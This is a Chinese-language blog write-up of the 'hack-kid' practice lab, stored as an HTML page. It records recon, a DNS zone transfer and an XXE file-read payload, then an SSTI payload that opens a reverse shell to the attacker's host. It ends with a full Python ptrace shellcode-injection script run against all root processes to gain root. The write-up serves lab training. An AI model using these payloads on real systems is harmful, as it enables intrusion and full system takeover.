@@ -1,0 +1,335 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hack-kid靶场 | 爱学习居士</title><meta name="author" content="爱学习居士"><meta name="copyright" content="爱学习居士"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集 登上53端口没东西 80端口  在页面源码中发现一个注释，要用get方法传一个page_no的参数,测试一下发现有回显，然后就爆破   发现21返回包长度与其他不同，然后测试一下可以发现hackers.blackhat.local这个子域  再扫一下80端口，可以发现一个app.html但是点了几下好像没用   9999开放的是Tornado服务，端口是一个登录页面，万能密码好像没什么用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack-kid靶场">
+<meta property="og:url" content="https://qinfuu.github.io/posts/3c06359a/index.html">
+<meta property="og:site_name" content="爱学习居士">
+<meta property="og:description" content="信息收集 登上53端口没东西 80端口  在页面源码中发现一个注释，要用get方法传一个page_no的参数,测试一下发现有回显，然后就爆破   发现21返回包长度与其他不同，然后测试一下可以发现hackers.blackhat.local这个子域  再扫一下80端口，可以发现一个app.html但是点了几下好像没用   9999开放的是Tornado服务，端口是一个登录页面，万能密码好像没什么用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qinfuu.github.io/image/32.jpg">
+<meta property="article:published_time" content="2025-10-26T07:03:32.000Z">
+<meta property="article:modified_time" content="2025-10-26T12:07:37.332Z">
+<meta property="article:author" content="爱学习居士">
+<meta property="article:tag" content="DNS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qinfuu.github.io/image/32.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hack-kid靶场",
+  "url": "https://qinfuu.github.io/posts/3c06359a/",
+  "image": "https://qinfuu.github.io/image/32.jpg",
+  "datePublished": "2025-10-26T07:03:32.000Z",
+  "dateModified": "2025-10-26T12:07:37.332Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "爱学习居士",
+      "url": "https://qinfuu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favixon.jpg"><link rel="canonical" href="https://qinfuu.github.io/posts/3c06359a/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hack-kid靶场',
+  isHighlightShrink: true,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom_cursor.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/styles/main.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/image/photo.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 叽里呱啦</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友人账</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/32.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">爱学习居士</span></a><a class="nav-page-title" href="/"><span class="site-name">hack-kid靶场</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 叽里呱啦</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友人账</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hack-kid靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-26T07:03:32.000Z" title="发表于 2025-10-26 15:03:32">2025-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-26T12:07:37.332Z" title="更新于 2025-10-26 20:07:37">2025-10-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/../textimg/hack-kid.assets/image-20251026160505705.png" alt="image-20251026160505705"></p>
+<p>登上53端口没东西</p>
+<p>80端口</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024142514495.png" alt="image-20251024142514495"></p>
+<p>在页面源码中发现一个注释，要用get方法传一个page_no的参数,测试一下发现有回显，然后就爆破</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024143918930.png" alt="image-20251024143918930"></p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024150512116.png" alt="image-20251024150512116"></p>
+<p>发现21返回包长度与其他不同，然后测试一下可以发现hackers.blackhat.local这个子域</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024150700894.png" alt="image-20251024150700894"></p>
+<p>再扫一下80端口，可以发现一个app.html但是点了几下好像没用</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024135739006.png" alt="image-20251024135739006"></p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024135759660.png" alt="image-20251024135759660"></p>
+<p>9999开放的是Tornado服务，端口是一个登录页面，万能密码好像没什么用登不上去毫无线索</p>
+<h2 id="DNS区域传输泄露"><a href="#DNS区域传输泄露" class="headerlink" title="DNS区域传输泄露"></a>DNS区域传输泄露</h2><p>把这个子域名和靶机ip添加到kali的hosts文件中，然后访问hackers.blackhat.local这个域名，发现和80端口一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../textimg/hack-kid.assets/image-20251024153820676.png" alt="image-20251024153820676"></p>
+<p>用dig命令来做一个axfr，然后我们就得到了所有的dns记录，拿到了当前域中所有的子域名，把这些域名像刚刚一样都加到hosts文件里</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024160125381.png" alt="image-20251024160125381"></p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024160717206.png" alt="image-20251024160717206"></p>
+<p>然后访问一下这两个刚刚探测到的域名，其中一个发现是一个注册页面，试着注册一下一直提醒邮箱没有效，在C:\Windows\System32\drivers\etc\hosts下面重新配置了一下，然后bp抓包</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024160919087.png" alt="image-20251024160919087"></p>
+<p>从抓包的请求体中可以看出来是以XML 格式上传的数据</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024174238133.png" alt="image-20251024174238133"></p>
+<h2 id="XXE注入获取shell"><a href="#XXE注入获取shell" class="headerlink" title="XXE注入获取shell"></a>XXE注入获取shell</h2><p>因为有xml的出现，我们可以猜测一下存在xxe漏洞</p>
+<blockquote>
+<p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发 生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载 恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站 等危害。</p>
+</blockquote>
+<p>先测试一下，这里发现saket用户和root拥有登陆bash的权限，存在xxe注入</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024175259641.png" alt="image-20251024175259641"></p>
+<p>使用php协议进行读取文件</p>
+<p>Bash shell 的重要配置文件.bashrc文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE  abc [&lt;!ENTITY test SYSTEM &#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;1&lt;/name&gt;</span><br><span class="line">    &lt;tel&gt;1&lt;/tel&gt;</span><br><span class="line">    &lt;email&gt;</span><br><span class="line">	&amp;test;</span><br><span class="line">	&lt;/email&gt;</span><br><span class="line">    &lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp中得到类似base64的字符串，解密一下的到账号密码，尝试登陆一下<a target="_blank" rel="noopener" href="http://192.168.19.137:9999/">http://192.168.19.137:9999/</a></p>
+<p>依旧和之前的是一样的界面</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024181612417.png" alt="image-20251024181612417"></p>
+<p>但是因为saket用户和root都有权限而且这个密码还和saket有关</p>
+<p>把用户名换成saket，登录上去了，显示要告诉它名字</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024183517250.png" alt="image-20251024183517250"></p>
+<p>传一个名字，有回显，name&#x3D;25的时候回显是25，进行了一个转义，一个SSTI模板注入的漏洞</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024184312898.png" alt="image-20251024184312898"></p>
+<p>再用其它方法测试一下，存在SSTI模板注入的漏洞</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024184312898.png" alt="image-20251024184312898"></p>
+<p><img src="/../textimg/hack-kid.assets/image-20251024185415971.png" alt="image-20251024185415971"></p>
+<p>写一个payload来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.19.137:9999/?name=&#123;&#123;__import__(%27os%27).system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.19.132/5555%200%3E%261%22%27)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../textimg/hack-kid.assets/image-20251026111905042.png" alt="image-20251026111905042"></p>
+<p>同时用自己的kali监听5555端口，可以发现已经拿到普通用户的权限</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251026112314063.png" alt="image-20251026112314063"></p>
+<p>上传一个LinEnum.sh脚本进行信息收集，有很多信息，其中历史命令中利用python2.7执行一个脚本，然后使用nc开启了一个端口监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../textimg/hack-kid.assets/image-20251026131937047.png" alt="image-20251026131937047"></p>
+<p>用.&#x2F;LinEnum.sh | grep python2.7收集一下有关python2.7的命令，这里有cap_sys_ptrace权限</p>
+<p>这个ptrace在逆向反调试的时候有点接触</p>
+<p>这里的cap_sys_ptrace我的理解就是Linux 的一种<strong>特权能力</strong>，允许进程调试其他进程、注入代码到运行中的进程</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16026088.html">https://www.cnblogs.com/f-carey/p/16026088.html</a></p>
+<p><img src="/../textimg/hack-kid.assets/image-20251026132653131.png" alt="image-20251026132653131"></p>
+<p>所以这里就可以将root权限的进程注入python类型shellcode来提权</p>
+<h2 id="Capabilities提权"><a href="#Capabilities提权" class="headerlink" title="Capabilities提权"></a>Capabilities提权</h2><p>这个python脚本注入成功后会开启5600端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="line"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"># Macros defined in &lt;sys/ptrace.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT   = 4</span><br><span class="line">PTRACE_GETREGS    = 12</span><br><span class="line">PTRACE_SETREGS    = 13</span><br><span class="line">PTRACE_ATTACH     = 16</span><br><span class="line">PTRACE_DETACH     = 17</span><br><span class="line"></span><br><span class="line"># Structure defined in &lt;sys/user.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><span class="line"></span><br><span class="line">class user_regs_struct(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (&quot;r15&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r14&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r13&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r12&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r11&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r10&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r9&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r8&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rcx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;orig_rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rip&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;cs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;eflags&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ss&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ds&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;es&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs&quot;, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">pid=int(sys.argv[1])</span><br><span class="line"></span><br><span class="line"># Define argument type and respone type.</span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"># Attach to the process</span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, None, None)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line"># Retrieve the value stored in registers</span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">print(&quot;Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">print(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line"># Shell code copied from exploit db.</span><br><span class="line">shellcode=&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line"># Inject the shellcode into the running process byte by byte.</span><br><span class="line">for i in xrange(0,len(shellcode),4):</span><br><span class="line"> </span><br><span class="line">  # Convert the byte to little endian.</span><br><span class="line">  shellcode_byte_int=int(shellcode[i:4+i].encode(&#x27;hex&#x27;),16)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip(&#x27;\x00&#x27;).encode(&#x27;hex&#x27;)</span><br><span class="line">  shellcode_byte=int(shellcode_byte_little_endian,16)</span><br><span class="line"> </span><br><span class="line">  # Inject the byte.</span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line">print(&quot;Shellcode Injected!!&quot;)</span><br><span class="line"></span><br><span class="line"># Modify the instuction pointer</span><br><span class="line">registers.rip=registers.rip+2</span><br><span class="line"></span><br><span class="line"># Set the registers</span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">print(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line"># Detach from the process.</span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, None, None)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../textimg/hack-kid.assets/image-20251026141733740.png" alt="image-20251026141733740"></p>
+<p>编辑好脚本后使用python开启web服务，将脚本上传上去，批量的注入到root进程中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `ps -eaf|grep root|grep -v &quot;grep&quot;|awk &#x27;&#123;print $2&#125;&#x27;`; do python2.7 exp.py $i; done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../textimg/hack-kid.assets/image-20251026141924773.png" alt="image-20251026141924773"></p>
+<p>结束之后看看端口的状态，再另起一个窗口发现提权成功</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251026142205309.png" alt="image-20251026142205309"></p>
+<p>已经有root权限了</p>
+<p><img src="/../textimg/hack-kid.assets/image-20251026140842599.png" alt="image-20251026140842599"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://qinfuu.github.io">爱学习居士</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://qinfuu.github.io/posts/3c06359a/">https://qinfuu.github.io/posts/3c06359a/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://qinfuu.github.io" target="_blank">爱学习居士</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DNS/">DNS</a></div><div class="post-share"><div class="social-share" data-image="/image/32.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/490db2dd/" title="ycb"><img class="cover" src="/image/38.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">ycb</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">爱学习居士</div><div class="author-info-description">失之东隅 收之桑榆</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">失之东隅 收之桑榆</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%B3%84%E9%9C%B2"><span class="toc-text">DNS区域传输泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96shell"><span class="toc-text">XXE注入获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capabilities%E6%8F%90%E6%9D%83"><span class="toc-text">Capabilities提权</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/3c06359a/" title="hack-kid靶场"><img src="/image/32.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hack-kid靶场"/></a><div class="content"><a class="title" href="/posts/3c06359a/" title="hack-kid靶场">hack-kid靶场</a><time datetime="2025-10-26T07:03:32.000Z" title="发表于 2025-10-26 15:03:32">2025-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" 